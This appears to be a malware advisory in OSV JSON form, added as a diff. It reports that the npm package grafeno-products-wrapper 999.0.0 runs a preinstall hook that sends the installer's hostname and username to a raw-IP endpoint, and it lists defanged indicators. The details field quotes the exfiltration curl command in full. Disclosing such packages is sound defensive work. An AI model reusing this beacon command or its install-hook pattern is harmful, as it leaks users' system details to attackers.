@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11686",
+  "modified": "2026-08-28T22:16:19Z",
+  "published": "2026-08-28T22:16:01Z",
+  "summary": "Malicious code in grafeno-products-wrapper (npm)",
+  "details": "The preinstall hook executes `curl -s hxxp://216[.]126[.]236[.]46:8080/rce?pkg=grafeno-products-wrapper\u0026h=$(hostname)\u0026u=$(whoami)`, contacting a remote server at IP 216[.]126[.]236[.]46:8080 (path /rce) and exfiltrating the installer's hostname and username at install time. The package is a minimal stub (a 25-byte index.js) whose only real behaviour is this install-time recon beacon to a raw-IP endpoint.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-products-wrapper",
+        "purl": "pkg:npm/grafeno-products-wrapper"
+      },
+      "versions": [
+        "999.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-products-wrapper/v/999.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11686"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:16:01Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46:8080"
+        ],
+        "sha256": [
+          "35266e388e07a30b5ca3c5facb1d3076b56ed168bde6a4367fae8611f4aef867"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46",
+          "hxxp://216[.]126[.]236[.]46:8080/rce"
+        ]
+      }
+    }
+  }
+}
